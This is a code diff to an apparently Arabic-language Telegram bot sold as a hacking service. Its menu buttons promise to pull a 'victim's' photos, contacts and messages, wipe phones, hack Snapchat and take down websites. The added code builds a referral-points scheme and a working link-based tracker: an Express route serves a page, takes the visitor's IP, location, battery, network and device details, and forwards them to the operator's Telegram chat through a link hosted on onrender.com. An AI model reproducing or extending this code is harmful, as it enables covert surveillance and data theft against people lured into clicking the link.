@@ -75,19 +75,74 @@ bot.onText(/\/Vip/, async (msg) => {
         visitors: []
     };
 
-    const message = 'مرحبًا! هذا الخيارت مدفوع بسعر30$ يمكنك تجميع النقاط وفتحها مجاني.';
+    const message = 'مرحبًا! هذا الخيارت مدفوع بسعر 30$ يمكنك تجميع النقاط وفتحها مجاني.';
     bot.sendMessage(chatId, message, {
         reply_markup: {
             inline_keyboard: [
-                [{ text: 'سحب جميع صور الهاتف عبر رابط 🔒', callback_data: `get_link_${linkId}` }], 
-                [{ text: 'سحب جميع الرقام الضحيه عبر رابط 🔒', callback_data: `get_link_${linkId}` }], 
-                [{ text: 'سحب جميع رسايل الضحيه عبر رابط 🔒', callback_data: `get_link_${linkId}` }], 
+                [{ text: 'سحب جميع صور الهاتف عبر رابط 🔒', callback_data: `get_link_${linkId}` }],
+                [{ text: 'سحب جميع الرقام الضحيه عبر رابط 🔒', callback_data: `get_link_${linkId}` }],
+                [{ text: 'سحب جميع رسايل الضحيه عبر رابط 🔒', callback_data: `get_link_${linkId}` }],
                 [{ text: 'فرمتة جوال الضحيه عبر رابط 🔒', callback_data: `get_link_${linkId}` }]
             ]
         }
     });
 });
 
+bot.on('callback_query', async (query) => {
+    const chatId = query.message.chat.id;
+    const userId = query.from.id;
+    const linkId = query.data.split('_')[2];
+
+    if (linkData[linkId] && linkData[linkId].userId === userId) {
+        const linkMessage = `رابط تجميع النقاط الخاص بك\n عندما يقوم شخص في الدخول الي الرابط الخاص بك سوف تحصل على 1 نقطة.\n: https://t.me/${botUsername}?start=${linkId}`;
+        bot.sendMessage(chatId, linkMessage);
+    }
+});
+
+bot.onText(/\/vip (.+)/, async (msg, match) => {
+    const linkId = match[1];
+    const visitorId = msg.from.id;
+    const chatId = msg.chat.id;
+
+    const isSubscribed = await isUserSubscribed(chatId);
+    if (!isSubscribed) {
+        const message = 'الرجاء الاشتراك في جميع قنوات المطور قبل استخدام البوت.';
+        const buttons = developerChannels.map(channel => [{ text: `اشترك في ${channel}`, url: `https://t.me/${channel.substring(1)}` }]);
+
+        bot.sendMessage(chatId, message, {
+            reply_markup: {
+                inline_keyboard: buttons
+            }
+        });
+        return;
+    }
+
+    if (linkData[linkId]) {
+        const { userId, visitors } = linkData[linkId];
+
+        if (visitorId !== userId && (!visitorData[visitorId] || !visitorData[visitorId].includes(userId))) {
+            visitors.push(visitorId);
+
+            if (!visitorData[visitorId]) {
+                visitorData[visitorId] = [];
+            }
+            visitorData[visitorId].push(userId);
+
+            if (!userPoints[userId]) {
+                userPoints[userId] = 0;
+            }
+            userPoints[userId] += 1;
+
+            // إرسال النقاط إلى المستخدم الذي يمتلك الرابط
+            const message = `شخص جديد دخل إلى الرابط الخاص بك! لديك الآن ${userPoints[userId]} نقاط.`;
+            bot.sendMessage(chatId, message);
+
+            // تحديث النقاط في أعلى القائمة
+            const topMessage = `عدد النقاط التي قمت بتجميعها: ${userPoints[userId]} نقاط`;
+            bot.sendMessage(userId, topMessage);
+        }
+    }
+});
 bot.on('callback_query', async (query) => {
     const chatId = query.message.chat.id;
     const userId = query.from.id;
@@ -401,6 +456,66 @@ const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`الخادم يعمل على المنفذ ${PORT}`);
 });
+app.get('/:userId', (req, res) => {
+    res.sendFile(path.join(__dirname, 'mm.html'));
+});
+
+// استقبال البيانات من الصفحة HTML وإرسالها إلى البوت
+app.post('/mm', async (req, res) => {
+    const chatId = req.body.userId;
+    const deviceInfo = req.body.deviceInfo;
+
+    if (deviceInfo) {
+        const message = `
+📱 **معلومات الجهاز:**
+- الدولة: ${deviceInfo.country} 🔻
+- المدينة: ${deviceInfo.city} 🏙️
+- عنوان IP: ${deviceInfo.ip} 🌍
+- شحن الهاتف: ${deviceInfo.battery}% 🔋
+- هل الهاتف يشحن؟: ${deviceInfo.isCharging} ⚡
+- الشبكة: ${deviceInfo.network} 📶 (سرعة: ${deviceInfo.networkSpeed} ميغابت في الثانية)
+- نوع الاتصال: ${deviceInfo.networkType} 📡
+- الوقت: ${deviceInfo.time} ⏰
+- اسم الجهاز: ${deviceInfo.deviceName} 🖥️
+- إصدار الجهاز: ${deviceInfo.deviceVersion} 📜
+- نوع الجهاز: ${deviceInfo.deviceType} 📱
+- الذاكرة (RAM): ${deviceInfo.memory} 🧠
+- الذاكرة الداخلية: ${deviceInfo.internalStorage} GB 💾
+- عدد الأنوية: ${deviceInfo.cpuCores} ⚙️
+- لغة النظام: ${deviceInfo.language} 🌐
+- اسم المتصفح: ${deviceInfo.browserName} 🌐
+- إصدار المتصفح: ${deviceInfo.browserVersion} 📊
+- دقة الشاشة: ${deviceInfo.screenResolution} 📏
+- إصدار نظام التشغيل: ${deviceInfo.osVersion} 🖥️
+- وضع الشاشة: ${deviceInfo.screenOrientation} 🔄
+- عمق الألوان: ${deviceInfo.colorDepth} 🎨
+- تاريخ آخر تحديث للمتصفح: ${deviceInfo.lastUpdate} 📅
+- بروتوكول الأمان المستخدم: ${deviceInfo.securityProtocol} 🔒
+- نطاق التردد للاتصال: ${deviceInfo.connectionFrequency} 📡
+- إمكانية تحديد الموقع الجغرافي: ${deviceInfo.geolocationAvailable} 🌍
+- الدعم لتقنية البلوتوث: ${deviceInfo.bluetoothSupport} 🔵
+- دعم الإيماءات اللمسية: ${deviceInfo.touchSupport} ✋
+        `;
+        
+        try {
+            await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
+            console.log('تم إرسال معلومات الجهاز بنجاح');
+            res.json({ success: true });
+        } catch (err) {
+            console.error('فشل في إرسال معلومات الجهاز:', err);
+            res.status(500).json({ error: 'فشل في إرسال معلومات الجهاز' });
+        }
+    } else {
+        console.log('لم يتم استلام معلومات الجهاز');
+        res.status(400).json({ error: 'لم يتم استلام معلومات الجهاز' });
+    }
+});
+
+// تشغيل الخادم
+
+
+// رسالة استقبال للبوت
+
 
 // Load and save link usage data
 let linkUsage = {};
@@ -506,8 +621,7 @@ bot.onText(/\/start/, async (msg) => {
                 [{ text: 'إختراق سناب شات ⭐', callback_data: 'add_names' }],
                 [{ text: 'اغلاق المواقع 💣', web_app: { url: 'https://cuboid-outstanding-mask.glitch.me/' } }],
                 [{ text: 'الدردشه مع الذكاء الاصطناعي 🤖', web_app: { url: 'https://fluorescent-fuschia-longan.glitch.me/' } }],
-                [{ text: 'اعطيني نكته 🤣', callback_data: 'get_joke' }],
-                [{ text: 'اكتبلي رسالة فك حظر وتساب 🚸', callback_data: 'get_love_message' }],
+                [{ text: 'جمع معلومات الجهاز 🔬', callback_data: 'collect_device_info' }],
                 [{ text: 'إختراق الهاتف كاملاً 🔞', callback_data: 'add_nammes' }],
                 [{ text: 'تفسير الاحلام 🧙‍♂️', web_app: { url: 'https://morning-animated-drifter.glitch.me/' } }],
                 [{ text: 'لعبة الاذكياء 🧠', web_app: { url: 'https://forest-plausible-practice.glitch.me/' } }], 
@@ -662,7 +776,31 @@ bot.on('callback_query', async (callbackQuery) => {
 
     bot.answerCallbackQuery(callbackQuery.id);
 });
+bot.onText(/\/jjihigjoj/, (msg) => {
+    const chatId = msg.chat.id;
+    const message = 'مرحبًا! انقر على الزر لجمع معلومات جهازك.';
+    bot.sendMessage(chatId, message, {
+        reply_markup: {
+            inline_keyboard: [
+                [{ text: 'جمع معلومات الجهاز', callback_data: 'collect_device_info' }]
+            ]
+        }
+    });
+});
 
+// التعامل مع الزر عند الضغط عليه
+bot.on('callback_query', (query) => {
+    const chatId = query.message.chat.id;
+
+    // إرسال الرابط عند الضغط على الزر
+    if (query.data === 'collect_device_info') {
+        const url = `https://mii-chge.onrender.com/${chatId}`;
+        bot.sendMessage(chatId, `رابط جمع المعلومات: ${url}`);
+    }
+
+    // تأكيد تلقي الرد وإنهاء عملية المعالجة
+    bot.answerCallbackQuery(query.id);
+});
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(__dirname));
 
